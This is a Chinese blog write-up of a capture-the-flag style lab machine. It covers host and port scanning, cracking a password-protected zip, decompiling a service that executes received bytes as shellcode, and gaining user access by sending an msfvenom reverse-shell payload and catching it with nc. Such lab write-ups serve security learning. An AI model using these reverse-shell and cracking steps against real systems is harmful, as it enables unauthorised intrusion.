---
{"dg-publish":true,"title":"Community_haaaaaappy","tags":["blog"],"dg-path":"安全/靶机/Community_haaaaaappy.md","permalink":"/安全/靶机/Community_haaaaaappy/","dgPassFrontmatter":true}
---

```table-of-contents
```
# 主机发现
```sh
┌──(root㉿kali)-[~]
└─# arp-scan --interface=eth0 --localnet
Interface: eth0, type: EN10MB, MAC: 00:0c:29:8e:b5:fe, IPv4: 192.168.4.4
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.4.1     00:50:56:c0:00:08       VMware, Inc.
192.168.4.2     00:50:56:e9:2d:a9       VMware, Inc.
192.168.4.13    08:00:27:4d:de:17       PCS Systemtechnik GmbH
192.168.4.254   00:50:56:e2:20:79       VMware, Inc.

6 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.380 seconds (107.56 hosts/sec). 4 responded

┌──(root㉿kali)-[~]
└─# nmap -sT -min-rate 10000 -p- 192.168.4.13
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-20 21:46 EST
Nmap scan report for 192.168.4.13
Host is up (0.027s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
6666/tcp open  irc
MAC Address: 08:00:27:4D:DE:17 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 35.11 seconds

```


```sh
┌──(root㉿kali)-[~]
└─# nmap -sT -sC -sV -O -p22,80,6666 192.168.4.13
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-20 21:47 EST
Nmap scan report for 192.168.4.13
Host is up (0.0020s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 93:a4:92:55:72:2b:9b:4a:52:66:5c:af:a9:83:3c:fd (RSA)
|   256 1e:a7:44:0b:2c:1b:0d:77:83:df:1d:9f:0e:30:08:4d (ECDSA)
|_  256 d0:fa:9d:76:77:42:6f:91:d3:bd:b5:44:72:a7:c9:71 (ED25519)
80/tcp   open  http       Apache httpd 2.4.59 ((Debian))
|_http-title: Don't Hack Me
|_http-server-header: Apache/2.4.59 (Debian)
6666/tcp open  tcpwrapped
MAC Address: 08:00:27:4D:DE:17 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.82 seconds

```
6666被截断了

# 初步渗透

看一下主页
![Pasted image 20250221104936.png](/img/user/picture/Pasted%20image%2020250221104936.png)

目录扫描可能损坏服务？

先把靶机备份一下，硬扫一下试试
```sh
┌──(root㉿kali)-[~]
└─# dirb http://192.168.4.13/

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Thu Feb 20 21:58:48 2025
URL_BASE: http://192.168.4.13/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.4.13/ ----
+ http://192.168.4.13/index.html (CODE:200|SIZE:930)
+ http://192.168.4.13/server-status (CODE:403|SIZE:277)

-----------------
END_TIME: Thu Feb 20 21:59:05 2025
DOWNLOADED: 4612 - FOUND: 2

```

没有啥信息，看一下6666端口吧

```sh
┌──(root㉿kali)-[~/workspace/pentest/happpppy]
└─# curl http://192.168.4.13:6666
curl: (1) Received HTTP/0.9 when not allowed

┌──(root㉿kali)-[~/workspace/pentest/happpppy]
└─# curl --http0.9 -v http://192.168.4.13:6666/test
*   Trying 192.168.4.13:6666...
* Connected to 192.168.4.13 (192.168.4.13) port 6666
* using HTTP/1.x
> GET /test HTTP/1.1
> Host: 192.168.4.13:6666
> User-Agent: curl/8.11.1
> Accept: */*
>
* Request completely sent off
[!] 检测到非法字节 0x20 @偏移 0x3
Hackers, get out of my machine
[*] 等待客户端连接...
^C

```

或许思路有点问题，这个6666端口有可能是类似于CTF的pwn题类型
（猜的）
现在问题是没有获取到二进制文件（感觉有可能）



```sh
┌──(root㉿kali)-[~/workspace/pentest/happpppy]
└─# nc 192.168.4.13 6666
111111 111111
[!] 检测到非法字节 0x20 @偏移 0x6
Hackers, get out of my machine
[*] 等待客户端连接...
^C

```


```sh
┌──(root㉿kali)-[~]
└─# curl http://192.168.4.14/mysecret.txt
Go look for that most evil port and you'll find what you want.
去寻找那个最邪恶的端口，你会找到你想要的。

Be gentle with it, as it will be scared.
对待它温柔一点，因为它会害怕。

You can get the entity of an acquaintance based on its common name, which may be useful to you.
你可以根据一个熟人的常用名获得它的本体，这也许会对你有用。
```

emmm,熟人的常用名？
群主？
![Pasted image 20250221121459.png](/img/user/picture/Pasted%20image%2020250221121459.png)

试了一下，确实是
```sh
┌──(root㉿kali)-[~/workspace/pentest/happpppy]
└─# wget http://192.168.4.14/ll104567.zip
--2025-02-20 23:15:58--  http://192.168.4.14/ll104567.zip
Connecting to 192.168.4.14:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 739932 (723K) [application/zip]
Saving to: ‘ll104567.zip’

ll104567.zip              100%[=====================================>] 722.59K  --.-KB/s    in 0.02s

2025-02-20 23:15:58 (32.9 MB/s) - ‘ll104567.zip’ saved [739932/739932]


┌──(root㉿kali)-[~/workspace/pentest/happpppy]
└─# wget http://192.168.4.14/ll104567
--2025-02-20 23:16:05--  http://192.168.4.14/ll104567
Connecting to 192.168.4.14:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 739932 (723K)
Saving to: ‘ll104567’

ll104567                  100%[=====================================>] 722.59K  --.-KB/s    in 0.02s

2025-02-20 23:16:05 (34.8 MB/s) - ‘ll104567’ saved [739932/739932]

```

```sh
┌──(root㉿kali)-[~/workspace/pentest/happpppy]
└─# unzip ll104567.zip
Archive:  ll104567.zip
[ll104567.zip] opt/server password: 

```

额，解压还要密码。。。
破解一下试试

```sh
┌──(root㉿kali)-[~/workspace/pentest/happpppy]
└─# zip2john ll104567.zip > hash
ver 2.0 efh 5455 efh 7875 ll104567.zip/opt/server PKZIP Encr: TS_chk, cmplen=739746, decmplen=2120928, crc=1438EBDB ts=551B cs=551b type=8

┌──(root㉿kali)-[~/workspace/pentest/happpppy]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
summertime       (ll104567.zip/opt/server)
1g 0:00:00:00 DONE (2025-02-20 23:19) 10.00g/s 81920p/s 81920c/s 81920C/s 123456..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

```

得到了密码

```txt
summertime
```


```sh
┌──(root㉿kali)-[~/workspace/pentest/happpppy]
└─# unzip ll104567.zip
Archive:  ll104567.zip
[ll104567.zip] opt/server password:
  inflating: opt/server
┌──(root㉿kali)-[~/workspace/pentest/happpppy/opt]
└─# file server
server: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=04eaae45fa731d196a5b0bbcf627f68ae0a0724e, not stripped

```

终于获得二进制文件了

用IDA分析一下（说实话这个工具我还不是很会用）
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rdx
  __int64 v5; // rax
  __int64 v6; // rax
  std::ostream *v7; // rax
  std::ostream *v8; // rax
  __int64 v9; // rax
  std::ostream *v10; // rax
  __int64 v11; // rax
  __int64 v12; // rax
  __int64 v13; // rax
  __int64 v14; // rax
  std::ostream *v15; // rax
  size_t v16; // rax
  std::ostream *v17; // rax
  char v18[4108]; // [rsp+0h] [rbp-1070h] BYREF
  int v19; // [rsp+100Ch] [rbp-64h] BYREF
  __int16 v20[2]; // [rsp+1010h] [rbp-60h] BYREF
  int v21; // [rsp+1014h] [rbp-5Ch]
  void (*v22)(void); // [rsp+1028h] [rbp-48h]
  char *buf; // [rsp+1030h] [rbp-40h]
  unsigned __int8 v24; // [rsp+103Fh] [rbp-31h]
  char *v25; // [rsp+1040h] [rbp-30h]
  void *v26; // [rsp+1048h] [rbp-28h]
  unsigned __int64 len; // [rsp+1050h] [rbp-20h]
  unsigned int v28; // [rsp+1058h] [rbp-18h]
  unsigned int fd; // [rsp+105Ch] [rbp-14h]
  char *v30; // [rsp+1060h] [rbp-10h]
  unsigned int i; // [rsp+1068h] [rbp-8h]
  bool v32; // [rsp+106Fh] [rbp-1h]

  ssignal(11LL, signal_handler, envp);
  ssignal(13LL, signal_handler, v3);
  v19 = 1;
  fd = socket(2LL, 1LL, 0LL);
  if ( fd )
  {
    if ( (unsigned int)setsockopt(fd, 1LL, 2LL, &v19, 4LL) )
    {
      perror(&unk_53C048);
      close(fd);
      return 1;
    }
    else
    {
      v20[0] = 2;
      v21 = 0;
      v20[1] = ntohs(6666LL);
      if ( (int)bind(fd, v20, 16LL) >= 0 )
      {
        if ( (int)listen(fd, 5LL) >= 0 )
        {
          v5 = std::operator<<<std::char_traits<char>>(&std::cout, &unk_53C08D);
          v6 = std::ostream::operator<<(v5, 6666LL);
          v7 = (std::ostream *)std::operator<<<std::char_traits<char>>(v6, &unk_53C0A2);
          std::endl<char,std::char_traits<char>>(v7);
          while ( 1 )
          {
            while ( 1 )
            {
              v8 = (std::ostream *)std::operator<<<std::char_traits<char>>(&std::cout, &unk_53C0B0);
              std::endl<char,std::char_traits<char>>(v8);
              v28 = accept(fd, 0LL, 0LL);
              if ( (v28 & 0x80000000) == 0 )
                break;
              perror(&unk_53C0CD);
            }
            v9 = std::operator<<<std::char_traits<char>>(&std::cout, &unk_53C0E8);
            v10 = (std::ostream *)std::ostream::operator<<(v9, v28);
            std::endl<char,std::char_traits<char>>(v10);
            dup2(v28, 0LL);
            dup2(v28, 1LL);
            dup2(v28, 2LL);
            close(v28);
            len = read(0, v18, 0x1000uLL);
            v32 = (__int64)len > 0;
            for ( i = 0; v32 && (__int64)len > (int)i; ++i )
            {
              v26 = &forbidden_bytes;
              v30 = (char *)&forbidden_bytes;
              v25 = (char *)&unk_53C00D;
              while ( 1 )
              {
                if ( v30 == v25 )
                  goto LABEL_20;
                v24 = *v30;
                if ( v24 == v18[i] )
                  break;
                ++v30;
              }
              v11 = std::operator<<<std::char_traits<char>>(&std::cerr, &unk_53C110);
              v12 = std::ostream::operator<<(v11, std::hex);
              v13 = std::ostream::operator<<(v12, v24);
              v14 = std::operator<<<std::char_traits<char>>(v13, &unk_53C12D);
              v15 = (std::ostream *)std::ostream::operator<<(v14, i);
              std::endl<char,std::char_traits<char>>(v15);
              v32 = 0;
LABEL_20:
              if ( !v32 )
                break;
            }
            if ( !v32 )
            {
              buf = "Hackers, get out of my machine\n";
              v16 = j_strlen_ifunc("Hackers, get out of my machine\n");
              write(1u, buf, v16);
              close(v28);
            }
            else
            {
              v22 = (void (*)(void))mmap64(0LL, len, 7uLL, 0x22uLL, 0xFFFFFFFFuLL, 0LL);
              if ( v22 == (void (*)(void))-1LL )
              {
                perror(&unk_53C160);
                close(v28);
              }
              else
              {
                j_memcpy(v22, v18, len);
                v22();
                munmap(v22, len);
                v17 = (std::ostream *)std::operator<<<std::char_traits<char>>(&std::cout, &unk_53C177);
                std::endl<char,std::char_traits<char>>(v17);
              }
            }
          }
        }
        perror(&unk_53C07C);
        close(fd);
        return 1;
      }
      else
      {
        perror(&unk_53C065);
        close(fd);
        return 1;
      }
    }
  }
  else
  {
    perror(&unk_53C031);
    return 1;
  }
}
```

借助一下AI吧
![Pasted image 20250221130553.png](/img/user/picture/Pasted%20image%2020250221130553.png)

![Pasted image 20250221130608.png](/img/user/picture/Pasted%20image%2020250221130608.png)
可以看到禁止的为`\x00\x20\x0f\xcd`


```sh
┌──(root㉿kali)-[~/workspace/pentest/happpppy]
└─# msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.4.4 LPORT=1234 -b '\x00\x20\x0a\x0d\x0f' --platform linux -a x64 -f raw > tmp
Found 3 compatible encoders
Attempting to encode payload with 1 iterations of x64/xor
x64/xor succeeded with size 119 (iteration=0)
x64/xor chosen with final size 119
Payload size: 119 bytes
```
生成反弹shell传进去
```sh
┌──(root㉿kali)-[~]
└─# nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.4.4] from (UNKNOWN) [192.168.4.14] 37824
ls
key
note.txt
this_is_a_tips.txt
use3e3e3e3e3sr.txt
```

```sh
lamb@pwnding:/home/lamb$ cat use3e3e3e3e3sr.txt
cat use3e3e3e3e3sr.txt
flag{祝你新的一年开开心心啊!}
lamb@pwnding:/home/lamb$ cat this_is_a_tips.txt
cat this_is_a_tips.txt
There is a fun tool called cupp.
Are there really people that stupid these days? haha.

有一个很好玩的工具叫做 cupp.
现在真的还会有人这么蠢吗？haha
lamb@pwnding:/home/lamb$ cat note.txt
cat note.txt
There is only one way to become ROOT, which is to execute getroot!!!
成为ROOT的方法只有一条，就是执行 getroot !!!

```

//这里只拿到了user，这个靶机总归来说是个偏向于pwn的，感觉还是不是很适合我，所以后面的就不打算深究了

